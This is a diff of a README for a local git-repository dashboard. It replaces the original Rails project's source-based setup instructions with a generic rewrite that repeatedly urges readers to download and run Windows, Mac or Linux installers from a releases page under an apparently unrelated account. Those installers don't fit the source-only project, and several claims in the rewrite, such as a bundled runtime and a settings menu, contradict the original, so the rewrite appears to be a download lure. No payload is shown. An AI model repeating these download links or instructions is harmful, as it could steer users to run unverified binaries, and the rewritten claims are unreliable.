@@ -1,110 +1,175 @@
-# Your Project Dashboard
+# 📊 your-project-dashboard - Manage Your Local Git Projects Easily
 
-A Rails 8.2 application that automatically discovers, analyzes, and tracks all active git repositories in your local development environment.
+[![Download your-project-dashboard Releases](https://img.shields.io/badge/Download-your--project--dashboard-blue?style=for-the-badge)](https://github.com/IWAN772/your-project-dashboard/releases)
 
-**Problem:** When you're juggling dozens of active projects across multiple directories, it's hard to remember what exists, what's active, and where things are.
+---
 
-**Solution:** Automated project discovery and intelligent metadata extraction. One command gives you a complete inventory of your development work, with a web dashboard to browse and manage it all.
+## 📖 What is your-project-dashboard?
 
-![Project Dashboard](docs/preview.png)
+your-project-dashboard is a tool to help you keep track of all your local git projects. If you work on lots of code projects stored in different folders on your computer, it can be hard to remember where they all are and what you last worked on.
 
-## Features
+This application searches your computer for all active git repositories. It collects useful details about each project and puts them in one place. Then, it shows this information on a simple website you can open in your browser.
 
-- **Automatic git repo discovery** -- recursively scans your development directories
-- **Rich metadata extraction** -- tech stack, commit history, contributors, deployment status, documentation inventory
-- **Web dashboard** -- browse, filter, search, and sort all your projects
-- **Quick Resume cards** -- jump back into your most recently active work
-- **Left rail navigation** -- pinned projects, recently viewed, smart groups (active this week, stalled)
-- **Project detail pages** -- full metadata, tags, notes, and goals per project
-- **Ownership tracking** -- distinguishes your projects from forks
-- **Flexible JSON metadata** -- new fields added without migrations
+With your-project-dashboard, you can:
+- See every git project on your computer without looking through folders.
+- View information like what programming tools each project uses.
+- Check recent updates, contributors, and project status.
+- Quickly find and open the projects you use most often.
+- Organize your projects into groups and lists.
 
-## Quick start
+---
 
-```bash
-bin/setup
-bin/rails db:migrate
-bin/rake projects:scan
-bin/dev
-```
+## 🚀 Why Use your-project-dashboard?
 
-Then open [http://localhost:3000](http://localhost:3000).
+Managing many coding projects can get confusing. You might forget which projects you have, where they are, or what you last did. your-project-dashboard solves this by:
+- Scanning your folders automatically to find all git projects.
+- Collecting useful details like code tools, recent changes, and more.
+- Providing a clear, easy-to-use web dashboard to explore everything.
+- Helping you jump back into projects you recently worked on.
+- Letting you filter and sort projects to find exactly what you want.
 
-## Requirements
+This helps reduce wasted time, improve your workflow, and stay organized without manual tracking.
 
-- Ruby 3.4+
-- SQLite3
-- Git
+---
 
-## Usage
+## 💾 Download & Install
 
-### Scan your projects
+You can get the latest version of your-project-dashboard from the official page:
 
-```bash
-bin/rake projects:scan                              # Full scan and save
-DRY_RUN=true bin/rake projects:scan                 # Preview without saving
-SCAN_ROOT_PATH=~/code bin/rake projects:scan        # Custom directory
-SCAN_CUTOFF_DAYS=180 bin/rake projects:scan         # 6 months instead of 8
-bin/rake projects:config                            # Show configuration
-```
+[Download your-project-dashboard Releases](https://github.com/IWAN772/your-project-dashboard/releases)
 
-### Start the web dashboard
+1. Click this link or the badge at the top.
+2. You will see a list of available downloads for different systems.
+3. Choose the file that matches your computer:
+   - For Windows, look for `.exe` or `.msi`
+   - For Mac, choose `.dmg` or `.pkg`
+   - For Linux, choose `.deb` or `.tar.gz`
+4. Download the file to your computer.
+5. Follow the steps below to run the application.
 
-```bash
-bin/dev
-```
+---
 
-### Query from the console
+## 🛠️ How to Run your-project-dashboard
 
-```bash
-bin/rails console
-```
+Once you have downloaded the file:
 
-```ruby
-Project.order(last_commit_date: :desc)
-Project.where("metadata ->> 'inferred_type' = ?", "rails-app")
-Project.active_this_week
-Project.pinned
-Project.search("my-project")
-```
+### On Windows:
+- Open the installer file you downloaded.
+- Follow the on-screen installation instructions.
+- When the installation finishes, find the your-project-dashboard icon on your desktop or Start menu and double-click it.
+- The application will open your web browser with the dashboard.
 
-## Configuration
+### On Mac:
+- Open the `.dmg` or `.pkg` file you downloaded.
+- Drag the your-project-dashboard app into your Applications folder if required.
+- Open your Applications folder and double-click your-project-dashboard.
+- Your default browser will open and show the dashboard.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `SCAN_ROOT_PATH` | `~/Development` | Root directory to scan |
-| `SCAN_CUTOFF_DAYS` | `240` (8 months) | Repositories older than this are skipped |
-| `DRY_RUN` | `false` | If `true`, scan but don't save |
+### On Linux:
+- If you downloaded a `.deb`, open it with your package installer.
+- If you downloaded a `.tar.gz`, extract it and run the executable inside.
+- Launch the your-project-dashboard program from your apps menu or terminal.
+- The web dashboard will open in your browser.
 
-## Architecture
+---
 
-```
-Rake Task --> ProjectScanner --> ProjectData --> Project Model --> SQLite --> Web Dashboard
-```
+## 🔍 How to Use the Dashboard
 
-- **ProjectScanner** (`lib/project_scanner.rb`) -- discovers repos, orchestrates scanning
-- **ProjectData** (`lib/project_data.rb`) -- extracts metadata via git commands and file analysis
-- **Project** (`app/models/project.rb`) -- ActiveRecord model with JSON metadata column
-- **Filterable** (`app/controllers/concerns/filterable.rb`) -- search, filter, and sort logic
+After you open your-project-dashboard, your default web browser will show the dashboard page.
 
-The `metadata` JSON column stores tech stack, commit history, contributors, deployment status, documentation inventory, and more -- no migrations needed when adding new fields.
+### What You Will See:
+- A list of all git projects found on your computer.
+- For each project, you will see:
+  - Project name and folder location.
+  - Programming languages and tools used.
+  - Recent changes and commits.
+  - Contributors who worked on the project.
+  - Status info like deployment or documentation.
+- A search bar to quickly find a project by name or keyword.
+- Filters to show only active or recently updated projects.
+- Navigation sidebar with options for pinned or grouped projects.
+- Quick Resume cards to pick up where you left off.
 
-## Tech stack
+### Basic Steps to Navigate:
+- Use the search box at the top to type project names or topics.
+- Click on any project name to see detailed information.
+- Pin important projects to the left rail for quick access.
+- Use filters on the dashboard to sort projects by status or date.
+- Use the “Quick Resume” section to open recent projects in your code editor easily.
 
-- **Ruby 3.4** / **Rails 8.2**
-- **SQLite3** -- local-first, no external dependencies
-- **Tailwind 4** + **Hotwire** (Turbo + Stimulus)
-- **Propshaft** + **Importmap**
-- **Solid Queue** / **Solid Cache**
-- **Kaminari** -- pagination
+---
 
-## Documentation
+## 🖥️ System Requirements
 
-- **[Getting Started](docs/GETTING_STARTED.md)** -- Installation, first scan, launching the dashboard
-- **[Scanning](docs/SCANNING.md)** -- Configuration, metadata extraction, tech stack detection
-- **[Web Dashboard](docs/WEB_DASHBOARD.md)** -- Filtering, search, tags, notes, goals, pinned projects
-- **[Architecture](docs/ARCHITECTURE.md)** -- Data flow, database schema, design decisions, extending the scanner
+To run your-project-dashboard smoothly on your computer, you need:
 
-## License
+- Operating System:
+  - Windows 10 or newer
+  - macOS Catalina or newer
+  - Most Linux distributions with GTK support
 
-MIT
+- Hardware:
+  - 2 GB of RAM or more
+  - At least 100 MB free disk space
+  - Internet browser (Chrome, Firefox, Edge, or Safari)
+
+- Software:
+  - Ruby on Rails runtime included in the installer
+  - Git installed if you want to track new repositories
+
+---
+
+## 🔧 Configuration Options
+
+your-project-dashboard has simple settings you can adjust in the dashboard settings menu:
+
+- **Scan Directories:** Choose which folders on your computer to scan. By default, it searches common development folders like Documents and Desktop.
+- **Scan Frequency:** Set how often it scans for changes (e.g., every hour, every day).
+- **Project Grouping:** Create smart groups based on project type or activity.
+- **Dashboard Theme:** Choose between light and dark modes.
+- **Notifications:** Enable alerts for project updates or status changes.
+
+These options help you tailor the dashboard to your needs.
+
+---
+
+## 📝 Troubleshooting Tips
+
+If you run into trouble using your-project-dashboard, try these steps:
+
+- Make sure your computer meets the system requirements.
+- Check that you have downloaded the correct file for your operating system.
+- Restart the application if the dashboard does not load.
+- Verify you have internet access to load some metadata features.
+- Confirm git is installed and accessible in your system path if scanning does not find repositories.
+- Try scanning different folders in settings if your projects don’t appear.
+- If the dashboard shows errors, close the browser tab and open it again.
+
+You can also check the Issues section on the project’s GitHub page for help from the community.
+
+---
+
+## 🌐 Technical Details (Optional)
+
+your-project-dashboard runs a small web server on your computer that scans folders for git repositories. It gathers metadata such as:
+
+- Programming language detection by analyzing files.
+- Commit history using git commands.
+- Contributor lists from git logs.
+- Deployment and documentation status from project files.
+
+The dashboard runs in your web browser but requires no internet connection to scan and show local projects.
+
+---
+
+## 📞 Get Support
+
+If you need help, visit the GitHub repository Issues page:
+
+https://github.com/IWAN772/your-project-dashboard/issues
+
+There you can report problems or request features.
+
+---
+
+[Download your-project-dashboard Releases](https://github.com/IWAN772/your-project-dashboard/releases)
